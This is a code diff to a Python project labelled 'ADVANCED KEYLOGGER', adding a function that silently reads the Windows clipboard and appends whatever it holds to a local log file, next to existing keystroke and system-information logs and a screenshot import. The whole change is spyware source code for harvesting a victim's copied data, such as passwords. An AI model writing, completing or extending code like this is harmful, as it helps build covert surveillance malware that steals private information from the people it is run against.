@@ -33,6 +33,7 @@ from PIL import ImageGrab
 
 keys_info = "key_log.txt"
 system_info = "sys_info.txt"
+clipboard_info = "clipboard.txt"
 file_path = "C:\\Users\\MSI PC\\Desktop\\ADVANCED KEYLOGGER\\project"
 extend = "\\"
 
@@ -88,3 +89,16 @@ def get_system_info():
 
 get_system_info()
 
+def copy_clipboard():
+    with open(file_path + extend + clipboard_info, "a") as f:
+        
+        try:
+            win32clipboard.OpenClipboard()
+            pasted_data = win32clipboard.GetClipboardData()
+            win32clipboard.CloseClipboard()
+
+            f.write("Clipboard Data: " + pasted_data + "\n")
+        except Exception as e:
+            f.write("Could not read clipboard: " + str(e))
+        
+copy_clipboard()
